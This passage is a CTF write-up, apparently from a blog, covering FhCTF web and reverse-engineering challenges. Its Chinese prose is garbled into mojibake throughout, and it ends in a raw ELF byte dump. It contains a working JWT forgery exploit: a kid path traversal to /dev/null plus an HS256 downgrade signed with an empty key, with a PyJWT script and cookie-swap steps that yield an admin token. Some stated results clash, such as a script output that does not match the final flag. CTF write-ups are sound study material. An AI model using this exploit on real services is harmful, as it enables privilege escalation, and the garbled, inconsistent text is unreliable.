<p>é æœŸè¨­è¨ˆæ‡‰è©²æ˜¯ï¼š</p>
<ul>
<li>ä½¿ç”¨ <code>RS256</code>ï¼š
<ul>
<li>ä½¿ç”¨éå°ç¨±é‡‘é‘°ï¼ˆprivate key ç°½ç™¼ã€public key é©—è­‰ï¼‰ã€‚</li>
<li><code>.pem</code> æ‡‰è©²è¢«è¦–ç‚ºã€Œå…¬é‘°ã€ï¼Œåªèƒ½ç”¨ä¾†é©—è­‰ Signatureã€‚</li>
</ul>
</li>
</ul>
<p>ä½†ç¾åœ¨ä¼ºæœå™¨æ”¯æ´ <code>HS256 Compatibility Mode</code>ï¼Œå¯¦ä½œé¡ä¼¼ï¼š</p>
  <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> header[<span class="string">&quot;alg&quot;</span>] == <span class="string">&quot;RS256&quot;</span>:</span><br><span class="line">    <span class="comment"># ç”¨ public key (pem) é©—è­‰</span></span><br><span class="line"><span class="keyword">elif</span> header[<span class="string">&quot;alg&quot;</span>] == <span class="string">&quot;HS256&quot;</span>:</span><br><span class="line">    <span class="comment"># ä»ç„¶è®€åŒä¸€å€‹ pem æª”æ¡ˆï¼Œä½†æŠŠæ•´å€‹å…§å®¹ç•¶æˆ HMAC secret</span></span><br></pre></td></tr></table></figure>
<p>çµæœè®Šæˆï¼š</p>
<ul>
<li>ç•¶ <code>alg = HS256</code> æ™‚ï¼Œä¼ºæœå™¨æœƒæŠŠã€ŒåŸæœ¬æ˜¯å…¬é‘°çš„ pem æª”å…§å®¹ã€ç•¶æˆå°ç¨±é‡‘é‘°ï¼ˆsecretï¼‰ä¾†é©—è­‰ HMACã€‚</li>
<li>åªè¦æ”»æ“Šè€…ã€ŒçŸ¥é“ã€é€™å€‹ secretï¼Œå°±èƒ½åœ¨å¤–é¢è‡ªå·±ç°½ Tokenã€‚</li>
</ul>
<p>å•é¡Œæ˜¯ï¼š<code>default.pem</code> çš„å…§å®¹æˆ‘å€‘ä¸çŸ¥é“ï¼Œæ‰€ä»¥æ²’è¾¦æ³•ç›´æ¥åˆ©ç”¨ï¼›ä½†ç›®éŒ„éæ­·è®“æˆ‘å€‘å¯ä»¥é¸æ“‡ã€Œå…¶ä»–æª”æ¡ˆã€ä¾†ç•¶ secretã€‚</p>
</li>
<li>
<p>æ”»æ“Šæ€è·¯è¨­è¨ˆ</p>
<p>é—œéµæƒ³æ³•ï¼š</p>
<ol>
<li>æ‰¾ä¸€å€‹ã€Œå…§å®¹å·²çŸ¥ã€çš„ç³»çµ±æª”æ¡ˆï¼Œè®“ä¼ºæœå™¨æŠŠå®ƒè®€é€²ä¾†ç•¶ HMAC secretã€‚</li>
<li>å° Linux ä¾†èªªï¼Œ<code>/dev/null</code> çš„å…§å®¹å°±æ˜¯ç©ºçš„ï¼Œæ‰€ä»¥å¯ä»¥é æœŸï¼š
<ul>
<li>ç¨‹å¼è®€å– <code>/dev/null</code> â‡’ è®€åˆ°ç©ºå­—ä¸² <code>&quot;&quot;</code>ã€‚</li>
</ul>
</li>
<li>åªè¦æˆ‘å€‘åœ¨æœ¬åœ°ç«¯ç”¨ã€Œç©ºå­—ä¸²ã€ç•¶ secretï¼Œå°±èƒ½ç”¢å‡ºèˆ‡ä¼ºæœå™¨ä¸€è‡´çš„ HS256 ç°½ç« ã€‚</li>
<li>å†æŠŠ Payload è£¡çš„ <code>role</code> æ”¹æˆ <code>admin</code>ï¼Œå°±å¯ä»¥å½é€ ä¸€å€‹è¢«ä¼ºæœå™¨æ¥å—çš„ç®¡ç†å“¡ Tokenã€‚</li>
</ol>
<p>å› æ­¤æ”»æ“Šæ­¥é©Ÿæ˜¯ï¼š</p>
<ul>
<li>æŠŠ JWT Header çš„ï¼š
<ul>
<li><code>alg</code> æ”¹ç‚º <code>HS256</code></li>
<li><code>kid</code> æ”¹ç‚º <code>../../../../../../dev/null</code></li>
</ul>
</li>
<li>ç”¨ <code>key = &quot;&quot;</code> ï¼ˆç©ºå­—ä¸²ï¼‰ç°½ HMAC-SHA256ï¼Œç”¢ç”Ÿæ–°çš„ Tokenã€‚</li>
<li>å°‡ Payload ä¸­ <code>role</code> æ”¹æˆ <code>admin</code>ã€ç”šè‡³ <code>user</code> æ”¹æˆ <code>admin</code>ï¼Œé”æˆææ¬Šã€‚</li>
</ul>
</li>
<li>
<p>å¯¦ä½œ Exploitï¼ˆå½é€  JWTï¼‰</p>
<p>ä»¥ä¸‹ä½¿ç”¨ Python + PyJWT ç”Ÿæˆå½é€  Tokenï¼š</p>
  <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> jwt</span><br><span class="line"></span><br><span class="line"><span class="comment"># 1. æƒ¡æ„ Headerï¼šç›®éŒ„éæ­·æŒ‡å‘ /dev/nullï¼Œæ”¹ç”¨ HS256</span></span><br><span class="line">headers = &#123;</span><br><span class="line">    <span class="string">&quot;kid&quot;</span>: <span class="string">&quot;../../../../../../dev/null&quot;</span>,</span><br><span class="line">    <span class="string">&quot;alg&quot;</span>: <span class="string">&quot;HS256&quot;</span>,</span><br><span class="line">    <span class="string">&quot;typ&quot;</span>: <span class="string">&quot;JWT&quot;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment"># 2. æƒ¡æ„ Payloadï¼šç›´æ¥æŠŠè§’è‰²æ”¹æˆ admin</span></span><br><span class="line">payload = &#123;</span><br><span class="line">    <span class="string">&quot;role&quot;</span>: <span class="string">&quot;admin&quot;</span>,</span><br><span class="line">    <span class="string">&quot;user&quot;</span>: <span class="string">&quot;admin&quot;</span>,</span><br><span class="line">    <span class="string">&quot;iat&quot;</span>: <span class="number">1704355555</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment"># 3. ç°½åï¼šå¯†é‘°ç‚ºç©ºå­—ä¸²ï¼Œå°æ‡‰ä¼ºæœå™¨è®€å– /dev/null çš„çµæœ</span></span><br><span class="line">forged_token = jwt.encode(</span><br><span class="line">    payload,</span><br><span class="line">    key=<span class="string">&quot;&quot;</span>,</span><br><span class="line">    algorithm=<span class="string">&quot;HS256&quot;</span>,</span><br><span class="line">    headers=headers</span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;å½é€ çš„ Token:\n&quot;</span>, forged_token)</span><br></pre></td></tr></table></figure>
<p>æ­¥é©Ÿï¼š</p>
<ol>
<li>å¾åŸæœ¬ Cookie æ‹¿åˆ°åˆæ³• JWTï¼Œç¢ºèªæ¬„ä½åç¨±ï¼ˆä¾‹å¦‚ <code>role</code>ã€<code>user</code> ç­‰ï¼‰ã€‚</li>
<li>åŸ·è¡Œè…³æœ¬ï¼Œå¾—åˆ°ä¸€å€‹æ–°çš„ <code>forged_token</code> å­—ä¸²ã€‚</li>
<li>åœ¨ç€è¦½å™¨ä¸­ï¼š
<ul>
<li>F12 â†’ Application â†’ Cookiesã€‚</li>
<li>æ‰¾åˆ°åŸæœ¬å­˜ JWT çš„ Cookieï¼ˆä¾‹å¦‚ <code>access_token</code>ï¼‰ã€‚</li>
<li>å°‡å…¶å€¼æ•´å€‹æ›¿æ›ç‚º <code>forged_token</code>ã€‚</li>
</ul>
</li>
<li>é‡æ–°æ•´ç†é é¢ã€‚</li>
</ol>
<p>è‹¥å¾Œç«¯å¦‚é¡Œç›®æè¿°é‚£æ¨£å¯¦ä½œï¼Œä¼ºæœå™¨æœƒï¼š</p>
<ul>
<li>çœ‹åˆ° <code>alg = HS256</code> â†’ ç”¨ HMAC æ¨¡å¼é©—è­‰ã€‚</li>
<li>çœ‹åˆ° <code>kid = ../../../../../../dev/null</code> â†’ è®€å– <code>/dev/null</code> ç•¶ä½œ secretï¼ˆç©ºå­—ä¸²ï¼‰ã€‚</li>
<li>ç”¨ç©ºå­—ä¸²é©—è­‰ HMAC Signatureï¼Œå› ç‚ºæˆ‘å€‘æœ¬åœ°ç«¯ä¹Ÿæ˜¯ç”¨ç©ºå­—ä¸²ç°½çš„ï¼Œæ‰€ä»¥é©—è­‰æœƒé€šéã€‚</li>
<li>Payload è£¡ <code>role = admin</code>ï¼Œå› æ­¤èªå®šæˆ‘å€‘æ˜¯ç®¡ç†å“¡ã€‚<br />
<img src="/images/FhCTF/23.webp" alt="image" /><br />
<img src="/images/FhCTF/24.webp" alt="image" /></li>
</ul>
</li>
</ul>
<figure class="highlight smali"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">FhCTF&#123;Th3_k1d_u53d_JWT_t0_tr4v3rs3_p4th5&#125;</span><br></pre></td></tr></table></figure>
<h3 id="something-you-put-into"><a class="markdownIt-Anchor" href="#something-you-put-into"></a> Something You Put Into</h3>
<p>æª¢è¦– <code>main.py</code>ï¼Œå¯çŸ¥flagæ˜¯ç”±ç³»çµ±è¨­å®šå–å‡ºï¼š</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">FLAG = ChallSettings().flag</span><br></pre></td></tr></table></figure>
<p>ç¢ºèª <code>ChallSettings()</code> æœƒå¾ env variable ä¸­è®€å– Flagã€‚</p>
<p>æª¢æŸ¥ Docker YAML è¨­å®šæª”ï¼Œå¯ç™¼ç¾ Flag ä»¥ plain text å½¢å¼å­˜åœ¨ç’°å¢ƒè®Šæ•¸è¨­å®šä¸­ã€‚</p>
<figure class="highlight dust"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="language-xml">FhCTF</span><span class="template-variable">&#123;ğŸ·B3_c4r3ful_y0ur_SQL_synt4xğŸ·&#125;</span></span><br></pre></td></tr></table></figure>
<h2 id="reverse"><a class="markdownIt-Anchor" href="#reverse"></a> Reverse</h2>
<h3 id="ç°¡æ˜“è…³æœ¬é–±è®€å™¨"><a class="markdownIt-Anchor" href="#ç°¡æ˜“è…³æœ¬é–±è®€å™¨"></a> ç°¡æ˜“è…³æœ¬é–±è®€å™¨</h3>
<ul>
<li>å…ˆçœ‹PYï¼Œå¾ç¬¬ 2 è¡Œé–‹å§‹,è·³éäº† Flag<br />
<img src="/images/FhCTF/25.webp" alt="image" /></li>
<li>ç”¨æˆ¶è¼¸å…¥å¯ä»¥ä¿®æ”¹åˆ—è¡¨ä¸­çš„ä»»ä½•ä½ç½®<br />
<img src="/images/FhCTF/26.webp" alt="image" /></li>
<li>JUMP æŒ‡ä»¤å¯ä»¥æ”¹è®ŠæŒ‡ä»¤æŒ‡é‡åˆ°ä»»ä½•ç´¢å¼•<br />
<img src="/images/FhCTF/27.webp" alt="image" /><br />
é‚£å…¶å¯¦æˆ‘å€‘ç›´æ¥è¼¸å…¥ &quot;JUMP 0&quot; å°±å¥½äº†<br />
<img src="/images/FhCTF/28.webp" alt="image" /></li>
</ul>
<figure class="highlight dust"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="language-xml">FhCTF</span><span class="template-variable">&#123;f1l3_10_and_jumb_m4st3r&#125;</span></span><br></pre></td></tr></table></figure>
<h3 id="obf"><a class="markdownIt-Anchor" href="#obf"></a> OBF</h3>
<p>å…ˆçœ‹codeï¼Œä½¿ç”¨äº†å¤§é‡çš„æ··æ·†æŠ€è¡“:</p>
<ul>
<li>è®Šæ•¸å–®å­—æ¯å‘½å (K, H, G, J, C ç­‰)</li>
<li>ç°¡åŒ–çš„å…§ç½®å‡½æ•¸ (A=enumerate, E=chr, F=ord)</li>
<li>ç‹€æ…‹æ©Ÿè¨­è¨ˆ (ä½¿ç”¨å­—å…¸å’ŒæŒ‡é‡)</li>
<li>é­”æ³•æ•¸å­—å’Œå­—ç¬¦ä¸²</li>
</ul>
<p>codeå¯¦ç¾äº†ä¸€å€‹ç‹€æ…‹æ©Ÿ,æŒ‰ä»¥ä¸‹é †åºåŸ·è¡Œ:</p>
<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">ç‹€æ…‹ 1: XOR 66 è§£ç¢¼</span><br><span class="line">  è³‡æ–™: [58,34,118,...,34]</span><br><span class="line">  çµæœ: &#x27;|`0|`.T1W0.`,`k`&#x27;</span><br><span class="line">  </span><br><span class="line">ç‹€æ…‹ 5: å­—ç¬¦ä¸²åå‘</span><br><span class="line">  è³‡æ–™: &#x27;wEGLxxnj0nbU2fsm&#x27;</span><br><span class="line">  åå‘: &#x27;msfU2bn0jnxxLGEw&#x27;</span><br><span class="line">  </span><br><span class="line">ç‹€æ…‹ 2: Base64 è§£ç¢¼</span><br><span class="line">  è³‡æ–™: &#x27;WEVBVldCWkM1UVBWQktHeA==&#x27;</span><br><span class="line">  è§£ç¢¼: &#x27;XEAVWBZC5QPVBKHX&#x27;</span><br><span class="line">  </span><br><span class="line">ç‹€æ…‹ 3: å­—ç¬¦æ¸› 5</span><br><span class="line">  è³‡æ–™: &#x27;GFVzRJI9IctWCFa[&#x27;</span><br><span class="line">  çµæœ: &#x27;BAQuMED4D^oR&gt;A\V&#x27;</span><br><span class="line">  </span><br><span class="line">ç‹€æ…‹ 4: é©—è­‰å®Œæˆ</span><br><span class="line">  æª¢æŸ¥å¯†é‘°é•·åº¦ &gt;= 64 âœ“</span><br><span class="line">  å®Œæ•´å¯†é‘° (64 å­—ç¬¦)</span><br></pre></td></tr></table></figure>
<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">|`0|`.T1W0.`,`k`BAQuMED4D^oR&gt;A\VXEAVWBZC5QP...</span><br></pre></td></tr></table></figure>
<p>é€™å€‹å¯†é‘°æ˜¯é€šé 4 éƒ¨åˆ†çµ„åˆè€Œæˆ:</p>
<ul>
<li>XOR with 66: |0|.T1W0.,<code>k</code> (16 å­—ç¬¦)</li>
<li>å­—ç¬¦ - 5: BAQuMED4D^oR&gt;A\V (16 å­—ç¬¦)</li>
<li>Base64 è§£ç¢¼: XEAVWBZC5QPVBKHX (16 å­—ç¬¦)</li>
<li>å­—ç¬¦ä¸²åå‘: msfU2bn0jnxxLGEw (16 å­—ç¬¦)</li>
</ul>
<p>è§£å¯†éç¨‹<br />
çµ¦å®šçš„åŠ å¯†è¼¸å‡º:</p>
<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">3e08772c224960093145070318575a0e741e050c7a2d745a1b6f5a0d5834322b</span><br></pre></td></tr></table></figure>
<p>ä½¿ç”¨å¯†é‘°é€²è¡Œ XOR è§£å¯†:</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">flag = <span class="string">&#x27;&#x27;</span>.join([<span class="built_in">chr</span>(<span class="built_in">int</span>(hex_pair, <span class="number">16</span>) ^ <span class="built_in">ord</span>(key[i % <span class="number">64</span>]))</span><br><span class="line">               <span class="keyword">for</span> i, hex_pair <span class="keyword">in</span> <span class="built_in">enumerate</span>(hex_pairs)])</span><br></pre></td></tr></table></figure>
<figure class="highlight dust"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="language-xml">FhCTF</span><span class="template-variable">&#123;P0lym0rph1c_Crypt0&#125;</span></span><br></pre></td></tr></table></figure>
<h3 id="the-lock"><a class="markdownIt-Anchor" href="#the-lock"></a> The Lock</h3>
<p>ä½¿ç”¨ IDA éœæ…‹åˆ†æ</p>
<h4 id="ä¸»å‡½æ•¸-main-é‚è¼¯"><a class="markdownIt-Anchor" href="#ä¸»å‡½æ•¸-main-é‚è¼¯"></a> ä¸»å‡½æ•¸ (main) é‚è¼¯</h4>
<p>é€é IDA Pro åç·¨è­¯å¾Œï¼Œå¯ä»¥çœ‹åˆ° main å‡½æ•¸çš„æµç¨‹å¦‚ä¸‹ï¼š<br />
æ ¼å¼æª¢æŸ¥ (check_header)ï¼šæª¢æŸ¥è¼¸å…¥æ˜¯å¦ä»¥ FhCTF{ é–‹é ­ä¸¦ä»¥ } çµå°¾ã€‚<br />
æ ¸å¿ƒé©—è­‰ (check_password)ï¼šé€™æ˜¯æœ€é—œéµçš„å‡½æ•¸ï¼Œè‹¥å›å‚³å€¼ç‚ºçœŸï¼Œå‰‡ä»£è¡¨ Flag æ­£ç¢ºã€‚</p>
<h4 id="é©—è­‰å‡½æ•¸-check_password-åˆ†æ"><a class="markdownIt-Anchor" href="#é©—è­‰å‡½æ•¸-check_password-åˆ†æ"></a> é©—è­‰å‡½æ•¸ (check_password) åˆ†æ</h4>
<p>é€²å…¥ check_password å‡½æ•¸å¾Œï¼Œå¯ä»¥è§€å¯Ÿåˆ°ä»¥ä¸‹é—œéµé»ï¼š<br />
å­—ä¸²è™•ç†ï¼šç¨‹å¼ä½¿ç”¨ substr æå–äº†èŠ±æ‹¬è™Ÿå…§çš„å…§å®¹ã€‚<br />
é•·åº¦é™åˆ¶ï¼šå…§å®¹é•·åº¦å¿…é ˆæ­£å¥½ç‚º 26 å€‹å­—å…ƒã€‚<br />
é—œéµæ•¸æ“šï¼š<br />
v6 (é‡‘é‘°é™£åˆ—): [85, 51, 102, 17]<br />
v7 (ç›®æ¨™æ•¸å€¼é™£åˆ—): [7, 2, 20, 40, 47, 74, 97, 92, 32, 111, 21, 54, 83, 26, 113, 129, 132, 127, 37, 116, 140, 106, 101, 126, 87, 54]<br />
æ¼”ç®—æ³•å…¬å¼ï¼š</p>
<p class="katex-block"><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mrow><mi>v</mi><mn>7</mn><mo stretchy="false">[</mo><mi>i</mi><mo stretchy="false">]</mo><mo>=</mo><mo stretchy="false">(</mo><mi>v</mi><mn>6</mn><mo stretchy="false">[</mo><mi>i</mi><mspace></mspace><mspace width="1em"/><mo stretchy="false">(</mo><mrow><mi mathvariant="normal">m</mi><mi mathvariant="normal">o</mi><mi mathvariant="normal">d</mi></mrow><mspace width="0.3333em"/><mn>4</mn><mo stretchy="false">)</mo><mo stretchy="false">]</mo><mo>âŠ•</mo><mtext>input</mtext><mo stretchy="false">[</mo><mi>i</mi><mo stretchy="false">]</mo><mo stretchy="false">)</mo><mo>+</mo><mn>2</mn><mo>Ã—</mo><mi>i</mi></mrow><annotation encoding="application/x-tex">v7[i] = (v6[i \pmod 4] \oplus \text{input}[i]) + 2 \times i
</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.03588em;">v</span><span class="mord">7</span><span class="mopen">[</span><span class="mord mathnormal">i</span><span class="mclose">]</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mord mathnormal" style="margin-right:0.03588em;">v</span><span class="mord">6</span><span class="mopen">[</span><span class="mord mathnormal">i</span><span class="mspace allowbreak"></span><span class="mspace" style="margin-right:1em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mord"><span class="mord"><span class="mord mathrm">mod</span></span></span><span class="mspace" style="margin-right:0.3333em;"></span><span class="mord">4</span><span class="mclose">)]</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">âŠ•</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord text"><span class="mord">input</span></span><span class="mopen">[</span><span class="mord mathnormal">i</span><span class="mclose">])</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:0.7278em;vertical-align:-0.0833em;"></span><span class="mord">2</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">Ã—</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:0.6595em;"></span><span class="mord mathnormal">i</span></span></span></span></span></p>
<h4 id="æ¼”ç®—æ³•é‚„åŸèˆ‡é€†å‘"><a class="markdownIt-Anchor" href="#æ¼”ç®—æ³•é‚„åŸèˆ‡é€†å‘"></a> æ¼”ç®—æ³•é‚„åŸèˆ‡é€†å‘</h4>
<p>ç‚ºäº†å¾—åˆ°åŸå§‹è¼¸å…¥ï¼Œæˆ‘å€‘éœ€è¦å°‡ä¸Šè¿°å…¬å¼é€²è¡Œç§»é …ï¼Œåæ¨ <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mtext>input</mtext><mo stretchy="false">[</mo><mi>i</mi><mo stretchy="false">]</mo></mrow><annotation encoding="application/x-tex">\text{input}[i]</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord text"><span class="mord">input</span></span><span class="mopen">[</span><span class="mord mathnormal">i</span><span class="mclose">]</span></span></span></span>ï¼š<br />
å…ˆè™•ç†åŠ æ³•åç§»ï¼š<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>X</mi><mo>=</mo><mi>v</mi><mn>7</mn><mo stretchy="false">[</mo><mi>i</mi><mo stretchy="false">]</mo><mo>âˆ’</mo><mn>2</mn><mo>Ã—</mo><mi>i</mi></mrow><annotation encoding="application/x-tex">X = v7[i] - 2 \times i</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord mathnormal" style="margin-right:0.07847em;">X</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.03588em;">v</span><span class="mord">7</span><span class="mopen">[</span><span class="mord mathnormal">i</span><span class="mclose">]</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">âˆ’</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:0.7278em;vertical-align:-0.0833em;"></span><span class="mord">2</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">Ã—</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:0.6595em;"></span><span class="mord mathnormal">i</span></span></span></span><br />
å†è™•ç†ç•°æˆ–é‹ç®—ï¼š<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mtext>input</mtext><mo stretchy="false">[</mo><mi>i</mi><mo stretchy="false">]</mo><mo>=</mo><mi>X</mi><mo>âŠ•</mo><mi>v</mi><mn>6</mn><mo stretchy="false">[</mo><mi>i</mi><mspace></mspace><mspace width="0.4444em"/><mo stretchy="false">(</mo><mrow><mi mathvariant="normal">m</mi><mi mathvariant="normal">o</mi><mi mathvariant="normal">d</mi></mrow><mspace width="0.3333em"/><mn>4</mn><mo stretchy="false">)</mo><mo stretchy="false">]</mo></mrow><annotation encoding="application/x-tex">\text{input}[i] = X \oplus v6[i \pmod 4]</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord text"><span class="mord">input</span></span><span class="mopen">[</span><span class="mord mathnormal">i</span><span class="mclose">]</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.7667em;vertical-align:-0.0833em;"></span><span class="mord mathnormal" style="margin-right:0.07847em;">X</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">âŠ•</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.03588em;">v</span><span class="mord">6</span><span class="mopen">[</span><span class="mord mathnormal">i</span><span class="mspace allowbreak"></span><span class="mspace" style="margin-right:0.4444em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mord"><span class="mord"><span class="mord mathrm">mod</span></span></span><span class="mspace" style="margin-right:0.3333em;"></span><span class="mord">4</span><span class="mclose">)]</span></span></span></span><br />
è‡ªå‹•åŒ–è§£å¯†è…³æœ¬ (Python)<br />
ç‚ºäº†å¿«é€Ÿå¾—åˆ°çµæœï¼Œæˆ‘å€‘ç·¨å¯«ä»¥ä¸‹è…³æœ¬ï¼š</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">target = [<span class="number">7</span>, <span class="number">2</span>, <span class="number">20</span>, <span class="number">40</span>, <span class="number">47</span>, <span class="number">74</span>, <span class="number">97</span>, <span class="number">92</span>, <span class="number">32</span>, <span class="number">111</span>, <span class="number">21</span>, <span class="number">54</span>, <span class="number">83</span>, <span class="number">26</span>, <span class="number">113</span>, <span class="number">129</span>, <span class="number">132</span>, <span class="number">127</span>, <span class="number">37</span>, <span class="number">116</span>, <span class="number">140</span>, <span class="number">106</span>, <span class="number">101</span>, <span class="number">126</span>, <span class="number">87</span>, <span class="number">54</span>]</span><br><span class="line">key = [<span class="number">85</span>, <span class="number">51</span>, <span class="number">102</span>, <span class="number">17</span>]</span><br><span class="line"></span><br><span class="line">flag_content = <span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(target)):</span><br><span class="line">    <span class="comment"># é€†å‘å…¬å¼ï¼š(v7[i] - 2*i) XOR v6[i%4]</span></span><br><span class="line">    char_code = (target[i] - <span class="number">2</span> * i) ^ key[i % <span class="number">4</span>]</span><br><span class="line">    flag_content += <span class="built_in">chr</span>(char_code)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;Flag: FhCTF&#123;&#123;<span class="subst">&#123;flag_content&#125;</span>&#125;&#125;&quot;</span>)</span><br></pre></td></tr></table></figure>
<h4 id="æœ€çµ‚çµæœ"><a class="markdownIt-Anchor" href="#æœ€çµ‚çµæœ"></a> æœ€çµ‚çµæœ</h4>
<p>ç¶“éè…³æœ¬åŸ·è¡Œï¼ŒèŠ±æ‹¬è™Ÿå…§çš„å­—ä¸²ç‚º J3v3rs3_Eng1n33r1ng_1sOar7ã€‚<br />
Flag å…§å®¹åˆ†æï¼šè©²å­—ä¸²æ˜¯ Leet Speak å½¢å¼çš„ã€ŒReverse Engineering Is Artã€ã€‚</p>
<p>æœ€çµ‚ç­”æ¡ˆï¼š</p>
<figure class="highlight dust"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="language-xml">FhCTF</span><span class="template-variable">&#123;R3v3rs3_Eng1n33r1ng_1s_Ar7&#125;</span></span><br></pre></td></tr></table></figure>
<h3 id="å£æ‰çš„è§£ç¢¼å™¨"><a class="markdownIt-Anchor" href="#å£æ‰çš„è§£ç¢¼å™¨"></a> å£æ‰çš„è§£ç¢¼å™¨</h3>
<p>çµ¦äº†å…©å€‹æª”æ¡ˆ<br />
<img src="/images/FhCTF/a.webp" alt="{EFEA1592-5D42-4F42-A2D1-A2F66BD88A55}" /><br />
å…¶ä¸­encrypted_flagè£¡æœ‰<br />
<img src="/images/FhCTF/b.webp" alt="{58654F7F-3F17-4FA5-AEAC-649927D2FA73}" /><br />
decryptè£¡æœ‰</p>
<figure class="highlight livescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">ELF          &gt;    Â€      @       ?          @ <span class="number">8</span> </span><br><span class="line"> @         @       @       @       ?      ?                                                                                        ?      ?                                        !       !                                                                     X-      X=      X=      ?      @                   h-      h=      h=                                 <span class="number">8</span>      <span class="number">8</span>      